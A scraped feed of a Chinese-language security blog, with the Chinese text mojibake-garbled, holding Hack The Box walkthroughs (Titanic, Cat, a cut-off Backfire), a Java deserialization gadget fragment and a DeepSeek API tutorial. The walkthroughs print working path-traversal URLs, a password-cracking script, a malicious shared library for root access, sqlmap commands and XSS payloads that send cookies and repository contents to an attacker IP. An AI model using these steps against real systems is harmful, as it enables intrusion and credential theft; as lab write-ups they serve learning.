aClass.getDeclaredConstructor(Class.class, Map.class);\rdeclaredConstructor.setAccessible(true);\rObject o = declaredConstructor.newInstance(Target.class, decorated);\rserialize(o);\rdeserialize();\r}\rpublic void serialize(Object o) throws Exception {\rtry (ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get(\u0026#34;ser.ser\u0026#34;)))) {\roos.writeObject(o);\r}\r}\rpublic Object deserialize() throws Exception {\rtry (ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get(\u0026#34;ser.ser\u0026#34;)))) {\rreturn ois.readObject();\r}\r}\r} ChainedTransformeré‡Œé¢ç®€å•åŒ–çš„æ€è·¯å°±æ˜¯ğŸ‘‡\nimport org.junit.Test;\rpublic class CC1TEST_2 {\r@Test\rpublic void test2() throws Exception {\rObject getRuntime = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;).invoke(null);\rSystem.out.println(getRuntime instanceof Runtime); //true\rgetRuntime.getClass().getMethod(\u0026#34;exec\u0026#34;,String.class).invoke(getRuntime,\u0026#34;calc\u0026#34;);\r}\r} ","date":"2025-02-18","externalUrl":null,"permalink":"/posts/2025/02/common-collections-1/","section":"Posts","summary":"","title":"CommonCollections-1","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Titanic â¯ nmap titanic.htb -sV -T4 PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\r80/tcp open http Apache httpd 2.4.52\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ReadAnyFiles #\rè¿›å…¥titanic.htbï¼Œç‚¹å‡»Book Nowï¼Œä½¿ç”¨burpsuiteè¿›è¡ŒæŠ“åŒ…å‘ç°ä¸€ä¸ªdownloadè·¯ç”±\nå°è¯•å°†ticketçš„å‚æ•°ä¿®æ”¹ä¸ºå…¶ä»–æ–‡ä»¶\nå¯ä»¥çœ‹åˆ°æˆåŠŸä¸‹è½½\nä½¿ç”¨ä¸‹é¢çš„URLè¿›è¡Œä¸‹è½½å¯ä»¥è¯»å–åˆ°user.txt\nhttp://titanic.htb/download?ticket=../../../../../../../home/developer/user.txt Subdomain FUZZ #\rå°†dev.titanic.htbæ·»åŠ åˆ°**/etc/hosts**\nå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªGiteaçš„æœåŠ¡ï¼Œå¹¶ä¸”ç‰ˆæœ¬æ˜¯1.22.1\ngiteaçš„æ•°æ®åº“æ–‡ä»¶ä¸€èˆ¬åœ¨**/data/gitea.db**ä¸­\nè¿™é‡Œå°è¯•ä½¿ç”¨ä¸‹é¢çš„è·¯å¾„è¿›è¡Œä¸‹è½½\ntitanic.htb/download?ticket=../../../../../../home/developer/gitea/data/gitea/gitea.db æˆåŠŸæ‹¿åˆ°æ•°æ®åº“æ–‡ä»¶\nCrack Passwd #\rå¯ä»¥çœ‹åˆ°å¯†ç æ˜¯ç”¨pbkdf2è¿›è¡ŒåŠ å¯†çš„ï¼Œè¿™å’ŒHTB-Compiledæœ‰ä¸€ç‚¹ç±»ä¼¼\nç›´æ¥ä½¿ç”¨hashcatä¼šæœ‰ä¸€ç‚¹æ…¢ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯è„šæœ¬\nimport hashlib\rimport binascii\rdef pbkdf2_hash(password, salt, iterations=50000, dklen=50):\rhash_value = hashlib.pbkdf2_hmac(\r\u0026#39;sha256\u0026#39;,\rpassword.encode(\u0026#39;utf-8\u0026#39;),\rsalt,\riterations,\rdklen\r)\rreturn hash_value\rdef find_matching_password(dictionary_file, target_hash, salt, iterations=50000, dklen=50):\rtarget_hash_bytes = binascii.unhexlify(target_hash)\rwith open(dictionary_file, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as file:\rcount = 0\rfor line in file:\rpassword = line.strip()\rhash_value = pbkdf2_hash(password, salt, iterations, dklen)\rcount += 1\rprint(f\u0026#34;æ­£åœ¨æ£€æŸ¥å¯†ç  {count}: {password}\u0026#34;)\rif hash_value == target_hash_bytes:\rprint(f\u0026#34;\\nFound password: {password}\u0026#34;)\rreturn password\rprint(\u0026#34;Password not found.\u0026#34;)\rreturn None\rsalt = binascii.unhexlify(\u0026#39;8bf3e3452b78544f8bee9400d6936d34\u0026#39;)\rtarget_hash = \u0026#39;e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56\u0026#39;\rdictionary_file = \u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39;\rfind_matching_password(dictionary_file, target_hash, salt) ROOT #\rç™»å½•åï¼Œåœ¨**/opt/scripts**ä¸‹çœ‹åˆ°ä¸€ä¸ªè„šæœ¬æ–‡ä»¶\næŸ¥çœ‹åˆ°magickçš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œæ‰¾åˆ°ä¸€ä¸ªæ¼æ´\nArbitrary Code Execution in `AppImage` version `ImageMagick` Â· Advisory Â· ImageMagick/ImageMagick æ ¹æ®identify_image.shï¼Œéœ€è¦åœ¨**/opt/app/static/assets/imagesä¸­ç”Ÿæˆlibxcb.so.1æ‰èƒ½å¯¼è‡´rootæƒé™ä¸‹çš„magickè¯»å–åˆ°root.txt**\ncd /opt/app/static/assets/images\rgcc -x c -shared -fPIC -o ./libxcb.so.1 - \u0026lt;\u0026lt; EOF\r#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\r#include \u0026lt;unistd.h\u0026gt;\r__attribute__((constructor)) void init(){\rsystem(\u0026#34;cat /root/root.txt \u0026gt; /tmp/rootflag\u0026#34;);\rexit(0);\r}\rEOF ç„¶åä¿®æ”¹åŸæœ‰çš„ç›®å½•å†…å®¹ï¼Œæ¯”å¦‚è¯´å¤åˆ¶ä¸€ä¸ªå›¾ç‰‡\ncp home.jpg home2.jpg Summary #\rUserï¼šä»»æ„æ–‡ä»¶ä¸‹è½½å³å¯è·å–åˆ°user.txtï¼Œä¸è¿‡æ²¡æœ‰sshå¯†é’¥ï¼Œåœ¨å­åŸŸåçˆ†ç ´åå¾—çŸ¥æ˜¯giteaæœåŠ¡ï¼Œé€šè¿‡æ•°æ®åº“æ–‡ä»¶æ³„éœ²æ‹¿åˆ°äº†developerçš„å¯†ç hashï¼Œçˆ†ç ´åè¿›è¡Œç™»å½•ã€‚\nRootï¼šmagickçš„ç‰ˆæœ¬æ¼æ´ï¼Œè¯¥ç‰ˆæœ¬åœ¨æ‰§è¡Œæ—¶è®¾ç½®å’Œç¯å¢ƒå˜é‡æ—¶å¯èƒ½ä¼šä½¿ç”¨ç©ºè·¯å¾„ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´åœ¨æ‰§è¡Œæ—¶é€šè¿‡åŠ è½½å½“å‰å·¥ä½œç›®å½•ä¸­çš„æ¶æ„é…ç½®æ–‡ä»¶æˆ–å…±äº«åº“æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚éœ€è¦åœ¨identify_images.shæ‰€æŒ‡å®šçš„ç›®å½•ä¸‹è¿›è¡Œåˆ›å»ºé…ç½®ï¼Œç­‰å¾…è„šæœ¬æ‰§è¡Œå³å¯è·å¾—root.txtã€‚\n","date":"2025-02-16","externalUrl":null,"permalink":"/posts/2025/02/htb-titanic/","section":"Posts","summary":"","title":"HTB-Titanic","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali â¯ nmap cat.htb\rPORT STATE SERVICE\r22/tcp open ssh\r80/tcp open http Dirsearch #\rå­˜åœ¨gitæ³„éœ²\nç”¨git-dumperè·å–åˆ°æºç \n[root@kali] /home/kali/Cat â¯ git-dumper http://cat.htb/.git/ ./catgit XSS #\råœ¨view_cat.phpä¸­å‘ç°å­˜åœ¨XSSçš„å¯èƒ½æ€§\n\u0026lt;?php\rsession_start();\rinclude \u0026#39;config.php\u0026#39;;\r// Check if the user is logged in\rif (!isset($_SESSION[\u0026#39;username\u0026#39;]) || $_SESSION[\u0026#39;username\u0026#39;] !== \u0026#39;axel\u0026#39;) {\rheader(\u0026#34;Location: /join.php\u0026#34;);\rexit();\r}\r// Get the cat_id from the URL\r$cat_id = isset($_GET[\u0026#39;cat_id\u0026#39;]) ? $_GET[\u0026#39;cat_id\u0026#39;] : null;\rif ($cat_id) {\r// Prepare and execute the query\r$query = \u0026#34;SELECT cats.*, users.username FROM cats JOIN users ON cats.owner_username = users.username WHERE cat_id = :cat_id\u0026#34;;\r$statement = $pdo-\u0026gt;prepare($query);\r$statement-\u0026gt;bindParam(\u0026#39;:cat_id\u0026#39;, $cat_id, PDO::PARAM_INT);\r$statement-\u0026gt;execute();\r// Fetch cat data from the database\r$cat = $statement-\u0026gt;fetch(PDO::FETCH_ASSOC);\rif (!$cat) {\rdie(\u0026#34;Cat not found.\u0026#34;);\r}\r} else {\rdie(\u0026#34;Invalid cat ID.\u0026#34;);\r}\r?\u0026gt;\r\u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;Cat Details: \u0026lt;?php echo $cat[\u0026#39;cat_name\u0026#39;]; ?\u0026gt;\u0026lt;/h1\u0026gt;\r\u0026lt;img src=\u0026#34;\u0026lt;?php echo $cat[\u0026#39;photo_path\u0026#39;]; ?\u0026gt;\u0026#34; alt=\u0026#34;\u0026lt;?php echo $cat[\u0026#39;cat_name\u0026#39;]; ?\u0026gt;\u0026#34; class=\u0026#34;cat-photo\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;cat-info\u0026#34;\u0026gt;\r\u0026lt;strong\u0026gt;Name:\u0026lt;/strong\u0026gt; \u0026lt;?php echo $cat[\u0026#39;cat_name\u0026#39;]; ?\u0026gt;\u0026lt;br\u0026gt;\r\u0026lt;strong\u0026gt;Age:\u0026lt;/strong\u0026gt; \u0026lt;?php echo $cat[\u0026#39;age\u0026#39;]; ?\u0026gt;\u0026lt;br\u0026gt;\r\u0026lt;strong\u0026gt;Birthdate:\u0026lt;/strong\u0026gt; \u0026lt;?php echo $cat[\u0026#39;birthdate\u0026#39;]; ?\u0026gt;\u0026lt;br\u0026gt;\r\u0026lt;strong\u0026gt;Weight:\u0026lt;/strong\u0026gt; \u0026lt;?php echo $cat[\u0026#39;weight\u0026#39;]; ?\u0026gt; kg\u0026lt;br\u0026gt;\r\u0026lt;strong\u0026gt;Owner:\u0026lt;/strong\u0026gt; \u0026lt;?php echo $cat[\u0026#39;username\u0026#39;]; ?\u0026gt;\u0026lt;br\u0026gt;\r\u0026lt;strong\u0026gt;Created At:\u0026lt;/strong\u0026gt; \u0026lt;?php echo $cat[\u0026#39;created_at\u0026#39;]; ?\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt; å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯ç›´æ¥å°†ç”¨æˆ·åè¾“å‡ºåˆ°é¡µé¢\nåœ¨contest.phpä¸­éšæ„ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡,ç„¶åç­‰å¾…ç®¡ç†å‘˜æ¥æŸ¥çœ‹è·å–åˆ°cookie\nå› æ­¤æ³¨å…¥ç‚¹å°±æ˜¯æ³¨å†Œæ—¶å€™çš„ç”¨æˆ·å\n\u0026lt;img src=1 onerror=this.src=\u0026#34;http://10.10.xx.xx/?ccc=\u0026#34;+encodeURIComponent(document.cookie)\u0026gt; ç›‘å¬å¾—åˆ°cookie\næ›¿æ¢åå¯ä»¥è¿›å…¥adminçš„ç®¡ç†é¢æ¿\nSQL Injection #\råœ¨accept_cat.phpä¸­å‘ç°äº†ç›´æ¥æ‹¼æ¥çš„sqlè¯­å¥,cat_nameæ²¡æœ‰ç»è¿‡è¿‡æ»¤\n\u0026lt;?php\rinclude \u0026#39;config.php\u0026#39;;\rsession_start();\rif (isset($_SESSION[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; $_SESSION[\u0026#39;username\u0026#39;] === \u0026#39;axel\u0026#39;) {\rif ($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34;) {\rif (isset($_POST[\u0026#39;catId\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;catName\u0026#39;])) {\r$cat_name = $_POST[\u0026#39;catName\u0026#39;];\r$catId = $_POST[\u0026#39;catId\u0026#39;];\r$sql_insert = \u0026#34;INSERT INTO accepted_cats (name) VALUES (\u0026#39;$cat_name\u0026#39;)\u0026#34;;\r$pdo-\u0026gt;exec($sql_insert);\r$stmt_delete = $pdo-\u0026gt;prepare(\u0026#34;DELETE FROM cats WHERE cat_id = :cat_id\u0026#34;);\r$stmt_delete-\u0026gt;bindParam(\u0026#39;:cat_id\u0026#39;, $catId, PDO::PARAM_INT);\r$stmt_delete-\u0026gt;execute();\recho \u0026#34;The cat has been accepted and added successfully.\u0026#34;;\r} else {\recho \u0026#34;Error: Cat ID or Cat Name not provided.\u0026#34;;\r}\r} else {\rheader(\u0026#34;Location: /\u0026#34;);\rexit();\r}\r} else {\recho \u0026#34;Access denied.\u0026#34;;\r}\r?\u0026gt; åœ¨config.phpä¸­å‘ç°äº†æ•°æ®åº“æ˜¯SQLlite\n\u0026lt;?php\r// Database configuration\r$db_file = \u0026#39;/databases/cat.db\u0026#39;;\r// Connect to the database\rtry {\r$pdo = new PDO(\u0026#34;sqlite:$db_file\u0026#34;);\r$pdo-\u0026gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\r} catch (PDOException $e) {\rdie(\u0026#34;Error: \u0026#34; . $e-\u0026gt;getMessage());\r}\r?\u0026gt; å› æ­¤å¤šåŠæ˜¯SQLç›²æ³¨çš„ç±»å‹\n[root@kali] /home/kali/Cat/catgit (master) â¯ sqlmap -u \u0026#34;http://cat.htb/accept_cat.php\u0026#34; --cookie=\u0026#34;PHPSESSID=918f1nvps72fc7rvk5umu13jch\u0026#34; --data=\u0026#34;catId=1\u0026amp;catName=123\u0026#34; -p catName --dbms=SQLite --level=5 å¾—åˆ°å››ä¸ªè¡¨\nåœ¨usersè¡¨ä¸­æ‹¿åˆ°äº†\nrosamendoza485@gmail.com ac369922d560f17d6eeb8b2c7dec498c (å¦‚æœçˆ†ä¸å‡ºæ¥,å¯èƒ½éœ€è¦é‡å¯é¶æœº)\nåˆ°è¿™ä¸ªç½‘ç«™å»è§£å¯†,æˆ‘ç”¨rockyou.txtå¥½åƒçˆ†ä¸å‡ºæ¥\nCrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc. ç”¨è¿™ä¸ªå¯†ç ç™»å½•rosaçš„è´¦å·,å‘ç°è¿˜æœ‰å…¶ä»–çš„å‡ ä¸ªç”¨æˆ·\næŸ¥çœ‹apacheçš„æ—¥å¿—,å¾—åˆ°äº†axelçš„å¯†ç \nrosa@cat:~$ cat /var/log/apache2/access.log | grep axel ç™»å½•åæ‹¿åˆ°user.txt\nROOT #\rå‘ç°äº†å†…éƒ¨å¼€å¯äº†3000ç«¯å£\nå°†å…¶è½¬å‘å‡ºæ¥,å‘ç°æ˜¯ä¸€ä¸ªGitæœåŠ¡\n[root@kali] /home/kali â¯ ssh rosa@cat.htb -L 3000:127.0.0.1:3000 å…¶ç‰ˆæœ¬å·æ˜¯1.22.0,æˆ‘æŸ¥è¯¢åˆ°äº†ä¸€ä¸ªå¯èƒ½çš„XSSæ¼æ´\nCVE-2024-6886 #\rGitea 1.22.0 - Stored XSS - Multiple webapps Exploit åœ¨**/var/mail/axel**ä¸­å¾—åˆ°ä¸€æ®µç•™è¨€\néœ€è¦ç»™jobertå‘é‚®ä»¶,ç„¶åä»–ä¼šæ£€æŸ¥ä»“åº“,é€ æˆXSSæ¼æ´\njobertåº”è¯¥æ˜¯æœ‰è®¿é—®employee-managementè¿™ä¸ªä»“åº“çš„æƒé™çš„\n\u0026lt;a href=\u0026#34;javascript:fetch(\u0026#39;http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php\u0026#39;).then(response =\u0026gt; response.text()).then(data =\u0026gt; fetch(\u0026#39;http://10.10.xx.xx/?content=\u0026#39;+encodeURIComponent(data)))\u0026#34;\u0026gt;XSS test\u0026lt;/a\u0026gt; ç”±äº25ç«¯å£æ˜¯å¼€åœ¨127.0.0.1ä¸Šçš„,å› æ­¤ä¹Ÿéœ€è¦å°†å…¶è½¬å‘å‡ºæ¥\nä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç»™jobertå‘é‚®ä»¶\n[root@kali] /home/kali â¯swaks --to \u0026#34;jobert@localhost\u0026#34; --from \u0026#34;axel@localhost\u0026#34; --header \u0026#34;Click\u0026#34; --body \u0026#34;http://localhost:3000/axel/xss\u0026#34; --server localhost è¿›è¡Œurlè§£ç æ‹¿åˆ°å¯†ç \næ‹¿åˆ°root.txt\nSummary #\rUser: é€šè¿‡Gitæ³„éœ²æ‹¿åˆ°æºç , å­˜åœ¨SQLæ³¨å…¥æ¼æ´æ‹¿åˆ°rosaçš„å¯†ç ,ç”±äºç½‘é¡µçš„ç™»å½•è¡¨å•æ˜¯é€šè¿‡GETæ˜æ–‡ä¼ è¾“çš„,å› æ­¤åœ¨apacheçš„æ—¥å¿—ä¸­æ‹¿åˆ°axelçš„å¯†ç ,ä»è€Œæ‹¿åˆ°user.txt\nRoot: å°†å†…ç½‘3000ç«¯å£è½¬å‘å‡ºæ¥æŸ¥æ‰¾åˆ°CVEæ¼æ´,åœ¨é‚®ä»¶ä¸­å¾—åˆ°çº¿ç´¢è¿›ä¸€æ­¥ç¡®è®¤æ˜¯XSSæ¼æ´,employee-managementè¿™ä¸ªä»“åº“è‡ªå·±æ— æ³•è®¿é—®åªèƒ½é€šè¿‡XSSå¤–å¸¦,æœ€ååœ¨å…¶index.phpä¸­æ‹¿åˆ°äº†å¯†ç \n","date":"2025-02-13","externalUrl":null,"permalink":"/posts/2025/02/htb-cat/","section":"Posts","summary":"","title":"HTB-Cat","type":"posts"},{"content":"","date":"2025-01-31","externalUrl":null,"permalink":"/tags/deepseek/","section":"Tags","summary":"","title":"Deepseek","type":"tags"},{"content":"\rå‰è¨€ #\ræœ€è¿‘å‡ºæ¥äº†ä¸€ä¸ªæ–°çš„å›½äº§AIæ¨¡å‹DeepSeekï¼Œå¹¶ä¸”å…·æœ‰æ·±åº¦æ€è€ƒçš„åŠŸèƒ½ã€‚\næˆ‘ä½“éªŒè¿‡åæ„Ÿè§‰æ¯”ChatGPTè¦å¥½å¾ˆå¤šï¼Œä½“ç°åœ¨DeepSeekèƒ½æ›´å¥½çš„ç†è§£ç”¨æˆ·çš„é—®é¢˜ã€‚\nä¸è¿‡å®˜ç½‘ä¸Šçš„å¯¹è¯ï¼Œæ€»æ˜¯è¦æ€è€ƒä¸€ä¼šï¼Œä»å‡ ç§’åˆ°å‡ åç§’ä¸ç­‰ï¼Œé—®é¢˜è¶Šå¤æ‚è€ƒè™‘çš„å°±è¶Šä¹…ï¼ˆå½“ç„¶è¿™æ˜¯å¥½äº‹ï¼Œå¯¹é—®é¢˜åˆ†æçš„è¶Šæ¸…æ™°ï¼Œå›ç­”çš„å‡†ç¡®ç‡å°±è¶Šé«˜ã€‚ä¹Ÿæœ‰å¯èƒ½æ˜¯æœåŠ¡å™¨è¢«æ”»å‡»äº†ï¼‰ã€‚\nå› æ­¤è¿™ç¯‡æ–‡ç« æ˜¯å…³äºå¦‚ä½•é€šè¿‡APIæ¥ä½¿ç”¨DeepSeek\nGroqCloud #\råˆ°ä¸‹é¢è¿™ä¸ªå®˜ç½‘ä¸­è¿›å…¥Dev Consoleï¼Œéœ€è¦ä½¿ç”¨è°·æ­Œæˆ–è€…Githubè´¦å·\nGroqCloud - Groq is Fast AI Inference åˆ‡æ¢æ¨¡å‹ä¸ºdeepseek-r1-distill-llama-70b\nä¸å®˜ç½‘ä¸Šçš„æ¨¡å‹ä¸åŒçš„æ˜¯ï¼ŒDeepSeek-R1-Distill-LLAMA-70B æ˜¯ DeepSeek å…¬å¸åŸºäº Meta çš„ LLAMA æ¨¡å‹ï¼Œé€šè¿‡çŸ¥è¯†è’¸é¦æŠ€æœ¯å¼€å‘çš„ä¸€æ¬¾é«˜æ•ˆå¤§è¯­è¨€æ¨¡å‹ã€‚å®ƒç»“åˆäº†å¤§è§„æ¨¡æ¨¡å‹çš„å¼ºå¤§èƒ½åŠ›å’ŒçŸ¥è¯†è’¸é¦å¸¦æ¥çš„é«˜æ•ˆæ€§ï¼Œå¹¿æ³›åº”ç”¨äºè‡ªç„¶è¯­è¨€ç†è§£å’Œç”Ÿæˆä»»åŠ¡ã€‚éšç€æŠ€æœ¯çš„ä¸æ–­å‘å±•ï¼Œè¿™ç±»æ¨¡å‹å°†åœ¨å„ä¸ªé¢†åŸŸå‘æŒ¥è¶Šæ¥è¶Šé‡è¦çš„ä½œç”¨ã€‚\nç‚¹å‡»å·¦ä¾§API Keysé‡Œçš„Create API Key\nCherry Studio #\råˆ°å®˜ç½‘ä¸‹è½½ä¸€ä¸ªå¯¹è¯è½¯ä»¶\nå¡«å…¥APIå¯†é’¥åï¼Œåº•éƒ¨æ·»åŠ ä¸€ä¸ªæ¨¡å‹ï¼Œåç§°ä¸€è‡´å³å¯\nå¯¹æ¯”æµ‹è¯• #\rå¯ä»¥çœ‹åˆ°ä½¿ç”¨APIè°ƒç”¨çš„æ·±åº¦æ€è€ƒæ—¶é—´æçŸ­ï¼Œåªæœ‰0.3ç§’\nå½“ç„¶ï¼ŒGroqCloudä¸Šé¢è¿˜æœ‰å…¶ä»–çš„æ¨¡å‹ï¼Œå¦‚æœä¸å–œæ¬¢DeepSeekä¹Ÿå¯ä»¥å°è¯•å…¶ä»–çš„\né€šè¿‡APIè°ƒç”¨èƒ½å¤ŸèŠ‚çœå¾ˆå¤šæ—¶é—´ï¼Œå°½ç®¡æ¨¡å‹åœ¨å‚æ•°ä¸Šæœ‰ä¸€ç‚¹åŒºåˆ«ï¼Œä½†æ˜¯ä¹Ÿå¤Ÿç”¨äº†\nPSï¼šä½¿ç”¨è¿‡ç¨‹éœ€è¦å¼€å¯æ¢¯å­\n","date":"2025-01-31","externalUrl":null,"permalink":"/posts/2025/01/deepseek-api-usage-tutorial/","section":"Posts","summary":"","title":"DeepSeekAPIè°ƒç”¨æ•™ç¨‹","type":"posts"},{"content":"","date":"2025-01-31","externalUrl":null,"permalink":"/tags/tutorial/","section":"Tags","summary":"","title":"Tutorial","type":"tags"},{"content":"","date":"2025-01-31","externalUrl":null,"permalink":"/categories/tutorial/","section":"Categories","summary":"","title":"Tutorial","type":"categories"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Backfire â¯ nmap backfire.htb -sV -Pn -T4 PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)\r443/tcp open ssl/http nginx 1.22.1\r5000/tcp filtered upnp\r8000/tcp open http nginx 1.22.1\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel è®¿é—®backfire.htb:8000å¯ä»¥å¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶\nhavoc.yaotl\nTeamserver {\rHost = \u0026#34;127.0.0.1\u0026#34;\rPort = 40056\rBuild {\rCompiler64 = \u0026#34;data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc\u0026#34;\rCompiler86 = \u0026#34;data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc\u0026#34;\rNasm = \u0026#34;/usr/bin/nasm\u0026#34;\r}\r}\rOperators {\ruser \u0026#34;ilya\u0026#34; {\rPassword = \u0026#34;CobaltStr1keSuckz!\u0026#34;\r}\ruser \u0026#34;sergej\u0026#34; {\rPassword = \u0026#34;1w4nt2sw1tch2h4rdh4tc2\u0026#34;\r}\r}\rDemon {\rSleep = 2\rJitter = 15\rTrustXForwardedFor = false\rInjection {\rSpawn64 = \u0026#34;C:\\\\Windows\\\\System32\\\\notepad.exe\u0026#34;\rSpawn32 = \u0026#34;C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\u0026#34;\r}\r}\rListeners {\rHttp {\rName = \u0026#34;Demon Listener\u0026#34;\rHosts = [\r\u0026#34;backfire.htb\u0026#34;\r]\rHostBind = \u0026#34;127.0.0.1\u0026#34; PortBind = 8443\rPortConn = 8443\rHostRotation = \u0026#34;round-robin\u0026#34;\rSecure = true\r}\r} disable_tls.patch\nDisable TLS for Websocket management port 40056, so I can prove that\rsergej is not doing any work\rManagement port only allows local connections (we use ssh forwarding) so this will not compromize our teamserver\rdiff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc\rindex abdf1b5..6be76fb 100644\r--- a/client/src/Havoc/Connector.cc\r+++ b/client/src/Havoc/Connector.cc\r@@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )\r{\rTeamserver = ConnectionInfo;\rSocket = new QWebSocket();\r- auto Server = \u0026#34;wss://\u0026#34; + Teamserver-\u0026gt;Host + \u0026#34;:\u0026#34; + this-\u0026gt;Teamserver-\u0026gt;Port + \u0026#34;/havoc/\u0026#34;;\r+ auto Server = \u0026#34;ws://\u0026#34; + Teamserver-\u0026gt;Host + \u0026#34;:\u0026#34; + this-\u0026gt;Teamserver-\u0026gt;Port + \u0026#34;/havoc/\u0026#34;;\rauto SslConf = Socket-\u0026gt;sslConfiguration();\r/* ignore annoying SSL errors */\rSslConf.setPeerVerifyMode( QSslSocket::VerifyNone );\r- Socket-\u0026gt;setSslConfiguration( SslConf );\rSocket-\u0026gt;ignoreSslErrors();\rQObject::connect( Socket, \u0026amp;QWebSocket::binaryMessageReceived, this, [\u0026amp;]( const QByteArray\u0026amp; Message )\rdiff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go\rindex 9d1c21f..59d350d 100644\r--- a/teamserver/cmd/server/teamserver.go\r+++ b/teamserver/cmd/server/teamserver.go\r@@ -151,7 +151,7 @@ func (t *Teamserver) Start() {\r}\r// start the teamserver\r-\tif err = t.Server.Engine.RunTLS(Host+\u0026#34;:\u0026#34;+Port, certPath, keyPath); err != nil {\r+\tif err = t.Server.Engine.Run(Host+\u0026#34;:\u0026#34;+Port); err != nil {\rlogger.Error(\u0026#34;Failed to start websocket: \u0026#34; + err.Error())\r}\rçœ‹èµ·æ¥æ˜¯å¼€äº†ä¸€ä¸ªHavocæœåŠ¡ç«¯ï¼šHavocFramework/Havoc: The Havoc Framework\nå¹¶ä¸”æš´éœ²å‡ºäº†è¿æ¥çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œä¸è¿‡æˆ‘å®‰è£…å¥½Havocåå¹¶ä¸èƒ½è¿æ¥æˆåŠŸ\nHavoc RCE #\rç»è¿‡æœç´¢æˆ‘å‘ç°äº†ä¸€ä¸ªå¯èƒ½å­˜åœ¨çš„CVEæ¼æ´\n[github author=\u0026ldquo;chebuya\u0026rdquo; project=\u0026ldquo;Havoc-C2-SSRF-poc\u0026rdquo;][/github]\nä»¥åŠè¿™ä¸ª\n[github author=\u0026ldquo;IncludeSecurity\u0026rdquo; project=\u0026ldquo;c2-vulnerabilities\u0026rdquo;][/github]\nç¬¬ä¸€ä¸ªè„šæœ¬çš„ä¸»è¦åŠŸèƒ½\nä¼ªé€  agent æ³¨å†Œï¼šé€šè¿‡å‘é€ä¼ªé€ çš„ agent æ³¨å†Œè¯·æ±‚ï¼Œè§¦å‘ç›®æ ‡æœåŠ¡å™¨æ‰§è¡Œä¸€äº›æ“ä½œï¼ˆå¦‚æ‰“å¼€å¥—æ¥å­—ï¼‰ã€‚\næ‰“å¼€å¥—æ¥å­—ï¼šé€šè¿‡ç‰¹å®šçš„å‘½ä»¤æ§åˆ¶ç›®æ ‡æœåŠ¡å™¨æ‰“å¼€å¥—æ¥å­—ï¼Œå…è®¸è¿œç¨‹è¿æ¥ã€‚\nå†™æ•°æ®åˆ°å¥—æ¥å­—ï¼šå‘æœåŠ¡å™¨å¼€æ”¾çš„å¥—æ¥å­—å†™å…¥æ•°æ®ï¼Œå¯ä»¥ç”¨äºè¿›ä¸€æ­¥çš„è¯·æ±‚ã€‚\nè¯»å–å¥—æ¥å­—æ•°æ®ï¼šè¯»å–ç›®æ ‡æœåŠ¡å™¨å“åº”çš„æ•°æ®ï¼Œè·å–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ IP åœ°å€ï¼‰ã€‚\nç¬¬äºŒä¸ªè„šæœ¬çš„ä¸»è¦åŠŸèƒ½\nWebSocket è¿æ¥ï¼šé€šè¿‡ WebSocketï¼ˆåŠ å¯†çš„ wss://ï¼‰ä¸è¿œç¨‹å›¢é˜ŸæœåŠ¡å™¨å»ºç«‹è¿æ¥ã€‚\nèº«ä»½éªŒè¯ï¼šä½¿ç”¨ç”¨æˆ·åå’Œ SHA3-256 åŠ å¯†çš„å¯†ç è¿›è¡Œèº«ä»½éªŒè¯ã€‚\nç›‘å¬å™¨åˆ›å»ºï¼šå‘æœåŠ¡å™¨å‘é€è¯·æ±‚åˆ›å»ºä¸€ä¸ªç›‘å¬å™¨ï¼Œç”¨äºæ„å»º \u0026ldquo;demon agent\u0026rdquo;ã€‚\nè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼šé€šè¿‡å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œå‘æœåŠ¡å™¨å‘é€æ¶æ„è½½è·æ¥æ‰§è¡Œæœ¬åœ°å‘½ä»¤ï¼ˆRCEï¼‰ã€‚\nå› 